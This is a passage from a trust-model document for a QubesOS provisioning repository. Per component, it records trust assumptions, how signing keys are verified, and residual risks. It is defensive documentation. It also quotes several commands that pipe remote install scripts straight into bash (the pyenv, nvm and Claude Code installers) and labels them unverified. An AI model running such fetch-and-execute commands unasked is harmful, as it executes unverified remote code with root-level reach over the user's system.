# SEQS Trust Model

Companion to the [README](README.md). This document records, **per component**,
what you are implicitly trusting when you use the scripts in this repository,
how (or whether) that trust is verified, and the residual risk that remains.

QubesOS isolates qubes from one another. These scripts deliberately *cross* those
boundaries — copying code into dom0, installing software into templates, wiring
qubes together — so every crossing is a place where trust is extended. The point
of this file is to make each assumption explicit and reviewable.

The installer uses a thin dom0 runner, states under `salt/seqs/`, and configuration in `salt/pillar/seqs/config.sls`. Per-component fingerprint verification dates are recorded in their entries; GnosisVPN's key comes only from the project itself (§4).

## Re-verifying these claims yourself

This file is the *claim*. One companion document helps you check it before trusting the resulting qubes:

- **[VERIFY-HUMAN.md](VERIFY-HUMAN.md)** — a hands-on walkthrough for the operator: what to read top-to-bottom in what order, cross-check tables for every pinned signing-key fingerprint (with the exact `curl | gpg --show-keys` one-liners), install-time watch points, and the honest residual-risk summary. It also states the rules for using an LLM to assist the audit — chiefly that the instructions driving the LLM must originate outside the tree under audit. There is deliberately no in-repo machine-runnable verification protocol: a checklist shipped in the same commit as the code it checks can be rewritten alongside that code, so its PASS report would prove nothing to an auditor while looking like it does.

The 📝 *Reviewed* trust level used throughout this document is **not** "the author eyeballed it" — it is "you, the operator, should run VERIFY-HUMAN.md before extending dom0 trust to anything here."

## Trust levels

| Level | Meaning |
|-------|---------|
| ✅ Verified | Integrity checked against a cryptographic pin or an independent reference. |
| 📝 Reviewed | No automated check; trust rests on you having read the committed file. See VERIFY-HUMAN.md for how. |
| ⚠️ TOFU | Fetched over HTTPS; trust on first use — you trust TLS/CA + whoever answered, with no pin. Package-manager signatures apply *afterwards*. |
| ❌ Unverified | HTTPS transport only; no signature or checksum. Compromise of the host, CDN, mirror, or DNS means code execution. |

---

## 1. Trusted Computing Base

Trusted unconditionally — nothing in this repo can compensate if these are compromised.

### QubesOS + dom0
- **Trust assumption:** The hypervisor, dom0, and the qrexec/policy system enforce isolation correctly.
- **Established by:** The QubesOS project. Out of scope for this repo.
- **Residual risk:** A dom0 compromise is total. Note that `setup-qubes.sh` runs *in* dom0 — see §2.

### The QubesOS installation ISO
- **Trust assumption:** The ISO you installed from is genuine.
- **Established by:** ✅ [`docs/install-qubes.md`](docs/install-qubes.md#2-verify-the-iso-before-flashing-it) walks the operator through the full verification protocol: fetch the Qubes Master Signing Key, cross-check the QMSK fingerprint `427F 11FD 0FAA 4B08 0123 F01C DDFA 1A3E 3687 9494` against three independent sources (Qubes website, the `qubes-secpack` GitHub repo, `keys.openpgp.org`), trust the QMSK, fetch the release signing key, then `gpg --verify` the ISO. Same three-source pattern as the apt keys.
- **Residual risk:** A tampered ISO compromises everything from first boot, so the protocol is only as good as the operator's discipline in actually running it. The repo cannot enforce that step — skipping it makes every claim in this document downstream of it false.

### Qubes update proxy (`127.0.0.1:8082`)
- **Trust assumption:** The updates proxy and the sys-net/sys-firewall chain relay template downloads honestly.
- **Established by:** Qubes default configuration.
- **Residual risk:** It sees and routes all template `curl`/`apt` traffic. TLS still protects content end-to-end; a hostile proxy can block or attempt downgrades but not forge signed packages.

---

## 2. Bootstrap & installation

### The published commit hash (the trust anchor)
- **Trust assumption:** The commit hash you check out was published by a source that actually reviewed that revision.
- **Established by:** ❌ Nothing in this repository — deliberately **out of scope**. The repo cannot designate its own trusted source: any in-repo statement of "trust hashes from X" would itself be covered by the hash, so a hostile revision could simply name a hostile source. The repo is not signed and publishes no authoritative announcement channel.
- **Residual risk:** If the hash reaches you through the same place you clone from (the repository's hosting page, a search result), the anchor is circular — it proves only that the host served a self-consistent tree, and whoever controls the host controls both values. The source and the channel must be established outside this repository: a maintainer or auditor whose announcements you can authenticate through means you already trust. If no such source exists for you, you are the reviewer — see [VERIFY-HUMAN.md](VERIFY-HUMAN.md).

### The SEQS repository contents
- **Trust assumption:** Every script here does what it claims and nothing else.
- **Established by:** 📝 You. The README explicitly tells you to read every file first; **VERIFY-HUMAN.md** is the structured walkthrough for that read (what to look at, in what order, what to spot-check). The repo is not signed.
- **Residual risk:** Whoever can write to the repo (or the branch you pull) controls dom0 and every template. **Treat repo write-access as dom0-equivalent.** VERIFY-HUMAN.md guards against drift between the code and what TRUST.md claims, but it does not establish that the repo URL you cloned from is the one you meant.

### `REPO_VM` — the qube hosting the repo
- **Trust assumption:** The qube the repo is fetched from is not compromised.
- **Established by:** 📝 Your explicit `--repo-vm` choice; there is deliberately
  no default. Fetch contacts it once to resolve `HEAD` and once to export the
  resolved object. Stage-only and build-only never contact it.
- **Residual risk:** Fetch asks `REPO_VM` to resolve its checked-out `HEAD`,
  validates only that the answer has the shape of a full Git object ID, and
  exports that exact object (a commit holding a `.gitattributes` file is
  refused, since Git would apply it while exporting). This excludes modified and untracked working-tree
  files and avoids a moving-HEAD race when the source is honest, but dom0 does
  not compare the answer to the independently reviewed ID. A compromised
  source can return any ID, runner, or archive and falsely report success.
  `/var/lib/seqs/fetched/source-commit` records the source's answer; it is not
  cryptographic evidence of what was received. Because fetched data becomes
  root-executed Salt code, a compromised `REPO_VM` remains dom0-equivalent
  unless review catches the substituted bytes.
- **Guidance for the operator:** Use a fresh networked DisposableVM, name it explicitly with `--repo-vm`, keep it alive only through fetch, and then destroy it. Do **not** use a daily personal-data qube. For maintenance, repeat the disposable workflow or use a dedicated, minimal, network-light repo qube.

> **Scope of the commit binding:** `git show HEAD:setup-qubes.sh` and exporting
> the full object ID resolved from `HEAD` are working-tree hygiene controls
> under the assumption
> that `REPO_VM` and its Git behave honestly. They do not create an end-to-end
> cryptographic chain from the published commit to bytes executed in dom0.
> Achieving that would require an independent verifier already trusted in dom0
> or a separately authenticated runner/archive digest or signature.

### The dom0 bootstrap copy
- **Trust assumption:** `qvm-run -p REPO_VM git show HEAD:setup-qubes.sh`
  returns the runner from the revision already checked out and verified in the
  repository qube.
- **Established by:** 📝 The documented workflow verifies the checkout before
  bootstrap, and `git show HEAD:` avoids the live working-tree copy, assuming
  the source qube remains honest.
- **Residual risk:** This runner executes before any project code in dom0 can
  check it. A compromised `REPO_VM` can return arbitrary bytes, and dom0 no
  longer receives an independently supplied object ID to compare. Review the
  received runner before execution. The documented command appends
  `2>/dev/null` so source-qube ANSI / CSI / OSC output cannot reach the dom0
  terminal before the runner's `sanitize()` filter exists.

### Fetch, review, and staging
- **Trust assumption:** The tree staged under `/srv` is the fetched tree you reviewed.
- **Established by:** 📝 Fetch resolves the repository qube's `HEAD`, validates
  the returned full object-ID shape, exports `salt/` and `install-scripts/`
  from that exact Git object rather than the live working tree (refusing a
  commit with a `.gitattributes` file anywhere in its tree: Git applies it
  while exporting, so an `export-subst` or `export-ignore` attribute would
  make the exported bytes differ from the reviewed files), validates the
  archive (under 16,000,000 bytes transferred, and the files' listed sizes
  must add up to less too, since a sparse entry lists its full size but takes
  little archive space; tar reads it from stdin, where it refuses compressed
  data instead of decompressing it; only regular files and directories under `salt/` and
  `install-scripts/` with safe names, none named like SEQS's `.seqs-*` markers;
  a listing whose fields are not in their fixed format is refused), refuses
  the whole tree if a file holds a character that can make code display
  other than it runs (a terminal control, Unicode bidirectional control, or
  invisible character such as a zero-width space), records the resolved ID in
  `/var/lib/seqs/fetched/source-commit`, and saves the tree under
  `/var/lib/seqs/fetched`; stage requires its completion marker, displays the
  `/srv` diff, and copies it root-owned. Build requires the stage completion
  markers.
- **Residual risk:** `source-commit` and the transfer SHA256 are provenance and diagnostic records, not independent authentication. These boundaries help only if `REPO_VM` is honest or the operator reviews the fetched data before staging and building it. The README's single invocation stages and builds right after the fetch, without a pause for that review, so there the review rests on the checkout verified in the repository qube.

### `setup-qubes.sh` (thin dom0 runner)
- **Trust assumption:** Orchestrates fetch → stage → build correctly and fails loudly when a state fails.
- **Established by:** 📝 Reviewed. The runner requires `--qubes ...` or explicit `--all`, canonicalizes the selection, optionally applies one validated `--postfix` to every selected recipe, writes the root-owned recipe-to-instance runtime intent outside `/srv`, and reports separate staged-tree and build-plan hashes. Salt validates every requested recipe and generated instance name against the reviewed catalogue; only the selected instance map drives creation, target generation, provisioning, and air-gap checks, while unselected managed qubes remain untouched. Each managed qube records its catalogue recipe in the `seqs-recipe` feature, and a later run refuses to repurpose an instance recorded for a different recipe. All qube creation and provisioning logic lives in the Salt states; the runner sequences dom0, templates, and app qubes with `qvm-shutdown --wait` barriers so template root volumes are committed before app qubes snapshot them.
- **Residual risk:** Runs with the dom0 user's privileges plus `sudo` for `/srv` staging and `qubesctl`. Failure detection is belt-and-braces: `qubesctl`'s exit code **and** a scan of its (sanitized) output for salt's own failure markers (`Result: False`, non-zero `Failed:` summary), because qubesctl versions differ in whether failed states propagate non-zero. For `offline` qubes the runner independently re-checks that `netvm` and `default_dispvm` are explicitly none after the dom0 apply, and for `no_handoff` and `firewall` qubes that `default_dispvm` is, and refuses to provision anything if not.

> **Interrupted or failed runs.** The flow is **convergent**: a completed component is skipped while its `/rw/config/seqs/` marker records the SHA-256 of the files staged for it (scripts, pins, and shared libraries) and runs again when they changed, so a reviewed pin update reaches existing qubes instead of being reported as already done; existing qubes are reconfigured, and an interrupted creation of a catalogue qube is resumed through its intent marker in `/var/lib/seqs/intents/`. A same-named qube without that marker or the `seqs-managed` feature is refused; so are the QR camera qubes `sys-usb-webcam` and `seqs-qr-scanner` if a run stopped before marking them, which then must be removed by hand. A marker whose qube no longer exists is removed by the next build, and `delete-vms.sh` removes the marker of a qube it deletes. Per-component `timeout:` on the Salt `cmd.run` states (`component_timeout`, default 900 seconds) bounds a hung installer; after a timeout inside a template, treat its state as suspect and re-run.

### `install-scripts/*.sh` (run inside templates / app qubes)
- **Trust assumption:** Each install script is safe to run as root in its VM.
- **Established by:** 📝 Reviewed. They are delivered as salt fileserver payload (`salt://seqs/files/...`), staged onto tmpfs (`/run/seqs/stage`, evaporates at shutdown) and run as user `user` with internal **passwordless `sudo`** (full-template default) — i.e. root in that VM.
- **Residual risk:** A malicious or compromised install script owns that template and every app qube based on it.

### `lib/*.sh` staging mechanism
- **Trust assumption:** The shared libraries staged next to each install script are the genuine ones.
- **Established by:** 📝 Reviewed; shipped in the same validated tar transfer and delivered via the Salt fileserver. The libraries are overlaid **after** component files, so a component asset cannot shadow `verify-gpg.sh` or `brave.sh`.
- **Residual risk:** Same as any install script — runs as root in the template.

### The Qubes Salt management stack (`qubesctl`, disposable management VM)
- **Trust assumption:** Qubes' shipped `qubes-mgmt-salt` machinery (dom0 salt-ssh over qrexec, the disposable management VM, the `qvm.*` state modules) faithfully delivers states and files *into* qubes without letting qube output influence dom0.
- **Established by:** The QubesOS project — this is the distribution's own management mechanism, also used by `qubesctl state.highstate`.
- **Residual risk:** Part of the TCB (§1) in effect. Target templates must carry `qubes-mgmt-salt-vm-connector` (stock Debian templates do; minimal templates need it installed first, or the per-qube applies hang).

---

## 3. Software sources

### Debian and Qubes packages only ✅
The `adb`, `bluetooth`, `qr-camera`, `qr-display`, `wireguard`, and `xournalpp` components install only packages from the base template's Debian repositories (and, for `qr-camera`, `qubes-usb-proxy`, and for `bluetooth`, `qubes-audio-daemon` and `qubes-core-admin-client` from its Qubes repository), through the Qubes update proxy, and `trezor` installs only udev rules. They trust those archives and their signing keys, as the base template already does, and add no source of their own.

### apt-repo trust anchors: `chattr +i` on every embedded-key keyring
Each apt-repo component below (Brave, Signal, Element, Docker, VS Code, Proton VPN, GnosisVPN) uses a signing key verified against a pinned fingerprint at a known path under `/usr/share/keyrings/` or `/etc/apt/keyrings/`. SEQS writes the `/etc/apt/sources.list.d/…` entry that references it with `signed-by=`, except for GnosisVPN, whose package writes its own entry; there SEQS only checks and locks the keyring. After the install completes, the script checks that the keyring file still holds exactly the pinned key (the package's maintainer scripts ran while it was unlocked) and then runs `sudo chattr +i` on it. The Pin-Priority: -1 + named-package allowlist bounds which packages each repo can ship (for Brave this includes `brave-keyring`, a hard dependency of `brave-browser`; the script therefore writes the verified keyring back after the install, and holds `brave-keyring`: the package owns the locked file, so its next version would otherwise fail in dpkg and block every update of the template, as seen with the Qubes updater on the test machine). `chattr +i` is the additional layer: a root-running maintainer script inside an allowlisted package that did `cp /usr/share/<app>/something.gpg ${keyring}` would silently rotate the trust anchor the `signed-by=` directive references — with no SEQS verification ever firing again. Immutability turns that into a loud dpkg failure. It stops only an in-place rewrite of that file: a root maintainer script can still add a new sources entry or a keyring elsewhere, such as `/etc/apt/trusted.gpg.d/`. Only the SEQS component script unlocks the file, to write a keyring it checks against the pinned fingerprint (for GnosisVPN, the package itself writes the keyring, which the same check then covers), so a legitimate key rotation requires a reviewed change of that pin, re-verified against the independent sources documented per-component below.

### Brave — apt repository & signing keys ✅
- **Trust assumption:** Brave's apt signing keys are genuine; thereafter apt trusts whatever Brave signs.
- **Established by:** ✅ `lib/brave.sh` downloads the keyring and **aborts unless it contains exactly the three pinned key fingerprints**:
  - `DBF1A116C220B8C7164F98230686B78420038257`
  - `47D32A74E9A9E013A4B4926C68D513D36A73CD96`
  - `B2A3DCA350E67256740DF904DE4EC67BE4B0DCA0`

  The fingerprints were verified on **2026-05-18** by cross-checking three independent sources — forging the set would require compromising all three at once:

  1. The keyring served from the actual install source (the S3 apt bucket):
     <https://brave-browser-apt-release.s3.brave.com/brave-browser-archive-keyring.gpg>
  2. The same keys published as ASCII-armored PGP blocks on Brave's signing-keys page (a different host), under the heading "Linux Package Repositories — Release Channel":
     <https://brave.com/signing-keys/>
  3. Key `DBF1A116C220B8C7164F98230686B78420038257` independently hard-coded in an unrelated third-party project:
     <https://github.com/fphammerle/docker-brave-browser/blob/master/Dockerfile>

  See the `lib/brave.sh` header comment for the exact commands used.
- **Residual risk:** The pin only proves you got Brave's real keys; it does not vouch for what Brave builds and signs. The fingerprints were captured on **2026-05-18** — if Brave rotates keys the install fails by design and the pins must be re-verified against the links above.

### KeePassXC — AppImage with verified signature ✅
- **Trust assumption:** The KeePassXC AppImage really was built and released by the KeePassXC team.
- **Established by:** ✅ `install-scripts/components/keepass/template-vm.sh` embeds the KeePassXC release signing key, downloads the release's detached `.sig`, and **aborts unless `gpg --verify` confirms the AppImage is signed by that key** (primary fingerprint `BF5A669F2272CF4324C1FDA8CFB4C2166397D0D2`). The fingerprint was verified on **2026-05-18** against `keepassxc.org/verifying-signatures/`, a keys.openpgp.org by-fingerprint lookup, and the Arch Linux `keepassxc` PKGBUILD — see the script header. The verified file stays in a mktemp directory of the template's user, who already has passwordless sudo, until it is installed root-owned. The keepass qube is `offline`, which implies `no_handoff`: dom0 denies `qubes.OpenURL` from `A-keepass`, and the qube does not set the browser handoff as its default.
- **Residual risk:** The version (currently 2.7.12) is pinned in the script, together with the AppImage's SHA-256, so a mirror cannot serve an older release signed by the same key; an AppImage does not auto-update, so security fixes arrive only when the pin is bumped and the script re-run. The signing key is embedded in the repo, so it also inherits §2 repo trust.

### Signal — apt repository with an embedded, verified key ✅
- **Trust assumption:** Signal's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/signal/template-vm.sh` embeds the Signal signing key and **aborts unless its fingerprint matches the pinned value** `DBA36B5181D0C816F630E889D980A17457F6FB06`. Signal publishes no fingerprint, so it was cross-checked on **2026-05-18** against the key served at `updates.signal.org`, a keys.openpgp.org by-fingerprint lookup, and Wayback Machine snapshots from 2018/2020/2022 (the same key for 8+ years) — see the script header. The script also installs `/etc/apt/preferences.d/signal-xenial.pref`, which default-denies the entire `updates.signal.org` origin (`Pin-Priority: -1`) and re-allows only `signal-desktop` / `signal-desktop-beta` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Signal's real key; it does not vouch for what Signal builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `signal-desktop` — they cannot use this repo to publish a higher-version `bash`, `libc6`, `systemd`, etc. that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust.

### Docker — apt repository with an embedded, verified key ✅
- **Trust assumption:** Docker's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/docker/template-vm.sh` embeds the Docker signing key and **aborts unless its fingerprint matches the pinned value** `9DC858229FC7DD38854AE2D88D81803C0EBFCD88`. Verified on **2026-05-19** against `download.docker.com`, `keyserver.ubuntu.com` and `keys.openpgp.org` (and Wayback Machine snapshots from 2020/2023) — see the script header.
- **Residual risk:** docker-group membership granted to `user` is **equivalent to root inside the qube** — significant because dev qubes run untrusted build code. Images pulled at runtime are arbitrary code.

### Element — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Element apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/element/template-vm.sh` embeds the Element signing key and **aborts unless its fingerprint matches the pinned value** `12D4CD600C2240A9F4A82071D7B0B66941D01538`. Verified on **2026-05-20** against the key served at `packages.element.io/debian/element-io-archive-keyring.gpg`, a `keyserver.ubuntu.com` by-fingerprint lookup, and a `keys.openpgp.org` by-fingerprint lookup; a Wayback Machine snapshot from 2023 carries the same fingerprint. uid is the historical "riot.im packages <packages@riot.im>" (Element's prior name). Element Desktop is not in the Debian repositories (verified 2026-05-20), so the upstream apt repo is the only mainstream channel; the install procedure matches the Brave/Signal/KeePass pattern. The script also installs `/etc/apt/preferences.d/element-io.pref`, which default-denies the entire `packages.element.io` origin (`Pin-Priority: -1`) and re-allows only `element-desktop` / `element-desktop-nightly` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Element's real key; it does not vouch for what Element builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `element-desktop` — they cannot use this repo to publish a higher-version `bash` or other system package that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust. The embedded key's signing subkey expires on 2027-03-15 (the live key, checked on 2026-10-11, has the same date); after that date apt rejects the repository through the locked keyring until a reviewed update embeds the extended key.

### VS Code — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Microsoft signing key is genuine.
- **Established by:** ✅ `install-scripts/components/vscode/template-vm.sh` embeds the Microsoft signing key and **aborts unless its fingerprint matches the pinned value** `BC528686B50D79E339D3721CEB3E94ADBE1229CF`. Verified on **2026-05-21** against `packages.microsoft.com/keys/microsoft.asc`, `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header. The script also turns off the package's own repository setup (debconf `code/add-microsoft-repo false`) and deletes the unchecked `/usr/share/keyrings/microsoft.gpg` that the package's maintainer script writes. A later upgrade may write that file again; it is trusted only if an apt source references it, and with the repository setup off none does.
- **Residual risk:** VS Code extensions (the Marketplace) run with full user privileges — the real VS Code attack surface, beyond the package install.

### Proton VPN — apt repository with an embedded, verified key ✅
- **Trust assumption:** Proton's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/protonvpn/template-vm.sh` embeds the Proton signing key and **aborts unless its fingerprint matches the pinned value** `84B0D3492C76C9C6F5873C18EDA3E22630349F1C`. Verified on **2026-10-15**: Proton's Debian guide publishes the SHA-256 of `protonvpn-stable-release_1.0.8_all.deb`; the downloaded package matched it and its keyring held exactly this key, which signed the repository's current `InRelease` file and is served by keys.openpgp.org under the same fingerprint. SEQS embeds the key instead of installing that package. The script also installs `/etc/apt/preferences.d/protonvpn-stable.pref`, which default-denies the entire `repo.protonvpn.com` origin (`Pin-Priority: -1`) and re-allows only the app and the Proton libraries it depends on (`proton-vpn-*` and `python3-proton-*` packages, listed in the script).
- **Residual risk:** The key pin proves you have Proton's real key; it does not vouch for what Proton builds and signs. Both independent sources (the guide's hash and the keyserver) are reached over HTTPS, and Proton controls the guide. The app runs as the user, and its packages' maintainer scripts and its NetworkManager integration run as root in the VPN qube. The key expires on 2027-03-03; after that date apt rejects the repository through the locked keyring until a reviewed update embeds the extended key (the lint layer warns 180 days ahead).

### Telegram — snap
- **Trust assumption:** Canonical's snap store and the `telegram-desktop` publisher.
- **Established by:** ⚠️ snapd verifies Canonical-signed assertions; the snap content is the publisher's.
- **Residual risk:** Publisher or store compromise; the snap auto-updates.

### BitBoxApp — .deb with a verified signature ✅
- **Component:** `install-scripts/components/bitbox/template-vm.sh` — downloads the BitBoxApp `.deb` and its detached `.asc`.
- **Established by:** ✅ The script embeds the ShiftCrypto Security signing key and **aborts unless `gpg --verify` confirms the `.deb` is signed by it** (fingerprint `DD09E41309750EBFAE0DEF63509249B068D215AE`). Verified on **2026-05-19** against BitBox's own docs (which publish the fingerprint), `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header. The script also checks the `.deb`'s pinned SHA-256, which fixes the release, not only the signer. Installed via `apt-get` so dependencies resolve. `apt-get install` of a local `.deb` does not re-verify the signature; the verified file stays in a mktemp directory of the template's user, who already has passwordless sudo. (Not in the default wallet qube specs; add `bitbox` to a wallet qube's component list in `salt/pillar/seqs/config.sls` to include it.)
- **Residual risk:** The pinned version (currently 4.51.0) is bumped manually. A crypto wallet — keep its qube isolated.

### Apache OpenOffice — tarball with a verified signature ✅
- **Component:** `install-scripts/components/openoffice/template-vm.sh` — downloads the Apache OpenOffice tarball and its detached `.asc` from `downloads.apache.org`.
- **Established by:** ✅ The script embeds Jim Jagielski's Apache OpenOffice release signing key and **aborts unless `gpg --verify` confirms the tarball is signed by it** (fingerprint `A93D62ECC3C8EA12DB220EC934EA76E6791485A8`). Verified on **2026-05-19** against the Apache OpenOffice `KEYS` file, the Apache committer keyring (`people.apache.org`) and `keyserver.ubuntu.com` — see the script header. The script also checks the tarball's pinned SHA-256, which fixes the release, not only the signer. The tarball and its extracted `.deb`s stay in a mktemp directory of the template's user, who already has passwordless sudo, until `apt-get install`, which does not re-verify a signature for local `.deb`s.
- **Residual risk:** The pinned version (currently 4.1.16) is bumped manually; Apache OpenOffice releases infrequently.

### Ledger Live — AppImage with a verified signature ✅
- **Component:** `install-scripts/components/ledger/template-vm.sh` — downloads the versioned AppImage from `download.live.ledger.com`, and Ledger's SHA-512 list of the release's files with its signature from `resources.live.ledger.app`, then installs it root-owned as `/usr/bin/LedgerLive.AppImage`.
- **Established by:** ✅ The script embeds Ledger's ECDSA (secp256k1) public key and **aborts unless `openssl dgst -verify` confirms the list is signed by it and the list names the AppImage's pinned SHA-512**, which the downloaded file must have. The key is the one Ledger Live's own updater embeds (`apps/ledger-live-desktop/src/main/updater/ledger-pubkey.ts` in `github.com/LedgerHQ/ledger-live`); on **2026-10-25** it matched the key in the Whonix wiki's Ledger Live verification guide — two sources, not the three used for the OpenPGP keys. The pin fixes the release, not only the signer.
- **Residual risk:** The pinned version (currently 4.24.1) is bumped manually; once Ledger stops serving that release, the build fails until the pin is updated. Ledger rotates this key through its updater (each new key signed by the previous one), which the script does not follow: a rotation surfaces as a failed signature check. The AppImage is root-owned in the template, but the qube user has passwordless `sudo` (as in every SEQS qube), so a compromise of that user can make a swapped AppImage persist through `/rw`: treat it as a compromise of the wallet qube.

### pyenv (python component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/python/app-vm.sh` — `curl -fsSL https://pyenv.run | bash`.
- **Trust assumption:** Whatever `pyenv.run` serves at run time is benign.
- **Established by:** ❌ Unverified remote code piped to a shell. **This is a deliberate choice:** pyenv is kept, in preference to the apt `python3` package, for the flexibility of installing and switching Python versions — accepting the weaker trust. (`app-vm.sh` uses `set -Eeo pipefail` — `-u` is selectively omitted because pyenv's profile sourcing is not nounset-clean; `-e` and `pipefail` are on, so a `pyenv install` / `pip` failure does abort the build.)
- **Residual risk:** Full control of the dev qube for whoever controls `pyenv.run` or its redirect target. `pip install` then pulls from PyPI, which checks each file only against the hash PyPI itself serves; nothing is signature-verified or pinned.

### Claude Code — native installer (claude-code component) ❌
- **Component:** `install-scripts/components/claude-code/app-vm.sh` — `curl -fsSL https://claude.ai/install.sh | bash`.
- **Trust assumption:** The installer script served by `claude.ai`, and the binary it fetches, are genuine.
- **Established by:** ❌ Unverified — remote code piped to a shell over HTTPS, no signature or checksum; Anthropic publishes no pinnable artifact for this path. `-f` only ensures an HTTP error page is not executed.
- **Residual risk:** Whoever controls `claude.ai/install.sh` or DNS runs code in the dev qube. Claude Code then self-updates, so the trust is ongoing — not just at install time.

### nvm + Node.js (node component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/node/app-vm.sh` — `curl -fsSL …/nvm/<pinned-tag>/install.sh | bash`.
- **Trust assumption:** The pinned nvm `install.sh` served by GitHub is benign.
- **Established by:** ❌ Unverified remote code piped to a shell, pinned to a specific nvm release. **This is a deliberate choice:** nvm is kept, in preference to the apt `nodejs` package, for the flexibility of installing and switching Node versions — accepting the weaker trust.
- **Residual risk:** Whoever controls that script (or the pinned tag) runs code in the dev qube. `nvm install --lts` then downloads an unpinned Node.js build from nodejs.org, checked only against a checksum file from the same host, and `npm install` runs package lifecycle scripts — a large supply-chain surface.

### Brave wallet extensions ⚠️
- **Mechanism:** Each wallet qube's spec in `salt/pillar/seqs/config.sls` lists extensions as `brave-extension-<name>` components; the `seqs.qube` state looks `<name>` up in the `brave_extensions` map (name → Chrome Web Store ID) in the same pillar file (each qube's pillar slice ships only the IDs it references), installs Brave (`install_brave` in `lib/brave.sh`, which also applies a changed pin or key when the shared libraries changed), and force-installs the extension via an `external_update_url` manifest. No per-extension component directory exists.
- **Trust assumption:** Google's Web Store distribution and each extension's publisher.
- **Established by:** ⚠️ Web Store hosting + publisher; extensions auto-update silently.
- **Residual risk:** A large surface — every installed wallet extension can read pages and prompt to sign in the browser. Abandoned extensions (Liquality, BlockWallet, Frame) have been removed; the `brave_extensions` map should be periodically pruned to maintained projects only. The catalogue offers two minimal wallet qubes (Ledger + Rabby, Trezor + Rabby) — much smaller blast radius than a single qube with every extension. Note also that the force-install mechanism (`external_update_url` → Chrome Web Store, written into `/opt/brave.com/brave/extensions/<id>.json`) carries **no version pin and no `.crx` hash pin** — every Brave start fetches whatever the Web Store currently serves — and force-installed extensions cannot be disabled or removed from inside Brave's UI, so a known-bad extension requires removing it from the config and rebuilding the template (`delete-vms.sh`), since no state deletes an existing force-install manifest. Like the pyenv, nvm and Claude Code installers, Node.js, PyPI packages and the Telegram snap, this channel has no key or hash pinned against independent sources, as the repo's apt repositories have. Deferred — accepted in exchange for the ergonomic `brave_extensions` flow. **See also "Wallet qube egress is unrestricted ⚠️" in §4 — the qube hosting these extensions has no outbound firewall, so a compromised extension faces no second wall on the way out.**

---

## 4. Runtime & inter-qube wiring

### WireGuard NetVM
- **Trust assumption:** Debian's `wireguard-tools` package,
  Qubes networking/firewall services, the selected VPN provider, and the
  operator-supplied WireGuard configuration behave as expected.
- **Established by:** ✅ Software is installed from the configured,
  Debian-signed apt repositories. The provider configuration is supplied
  directly inside `A-wireguard`; SEQS does not download or authenticate it.
  The importer accepts only comments, section headers and the keys provider
  exports use (`PrivateKey`, `Address`, `DNS`, `MTU`, `ListenPort`,
  `PublicKey`, `PresharedKey`, `Endpoint`, `AllowedIPs`,
  `PersistentKeepalive`), so wg-quick hooks such as `PostUp`, which run as
  root, are refused.
- **Residual risk:** The VPN provider sees tunnel metadata and egress traffic,
  while the upstream network sees the VPN endpoint. The local forwarding
  killswitch protects client qubes, but `A-wireguard` itself retains upstream
  access in order to establish the tunnel. A malicious configuration or
  compromised VPN qube can alter routing; use a separate downstream firewall
  qube where defense against VPN-qube compromise is required.

### Fail-closed forwarding hook (WireGuard, GnosisVPN, and Proton VPN NetVMs) ✅
- **Component:** all three NetVMs add their killswitch script to `/rw/config/qubes-firewall-user-script` (WireGuard also its boot script to `/rw/config/rc.local`). `qubes-firewall` runs the hook directly after it recreates its chains; the script drops forwarding to `eth0` for IPv4 and IPv6 in `custom-forward`.
- **Established by:** ✅ The installers make each hook start with `#!`, and repair a hook from an earlier build that lacks it. In each of these qubes the hardware test checks that the hook starts with `#!`, that `qubes-firewall` is active, and that both drop rules are in place; with `--force-rerun` it first strips the line from the hooks SEQS added to, so the rerun shows the repair.
- **Residual risk:** Qubes creates both hooks with `#!/bin/sh`, so builds before ee9ba52 broke a hook only if it was missing or empty at build time. On Qubes 4.3 such a hook makes `qubes-firewall` fail at every start (`OSError: [Errno 8] Exec format error`), so neither the drop rules nor any client's accept rule exist, and client qubes reached nothing with the tunnel down. The qube then fails closed but would not forward through the tunnel either (not tested with the tunnel up).

### GnosisVPN NetVM
- **Trust assumption:** Debian's `wireguard-tools` and `openresolv` packages,
  Qubes networking/firewall services, the embedded GnosisVPN signing key, and
  GnosisVPN's package/runtime behavior.
- **Established by:** ✅ Debian prerequisites come from configured signed
  repositories: the runner installs them in the template as root through its
  normal `qubes.UpdatesProxy` route (`qvm-run -u root`, output sanitized). The `amd64` stable release `0.95.2`, listed on 2026-10-10 in
  the stable channel's APT index (whose `InRelease` file verified with the
  embedded key, and whose package entry matches the pin), is pinned to SHA-256
  `87294d45d382d22181089c2f7f0a25330c75b77ef22b3989d399abf4027d3bdb`
  and its detached signature must verify with embedded fingerprint
  `9A308031FD3BFE8EDBF5076D84F73FEA46D10972`. The key fingerprint is published
  in GnosisVPN's `SECURITY.md`; the operator should cross-check it
  independently. Download uses a temporary update-proxy AppVM whose firewall
  allows only DNS and `download.gnosisvpn.io:443`, with qrexec policy
  (`20-seqs-gnosisvpn-updates.policy`) scoped to the selected GnosisVPN
  template instance(s); the proxy is based on the TemplateVM of dom0's
  UpdateVM (`qubes-prefs updatevm`, resolved through the template chain of a
  DispVM), and the runner removes both proxy and
  policy afterward (after a killed run, at the start of the next build; a
  proxy killed before it was marked makes the next GnosisVPN build refuse
  until it is removed by hand). It
  refuses a dom0 UpdateVM built on a Whonix gateway, behind which that firewall
  is not enforced.
- **Residual risk:** The embedded key and fingerprint originate from the same
  upstream project, so this is not an independent trust anchor by itself. The
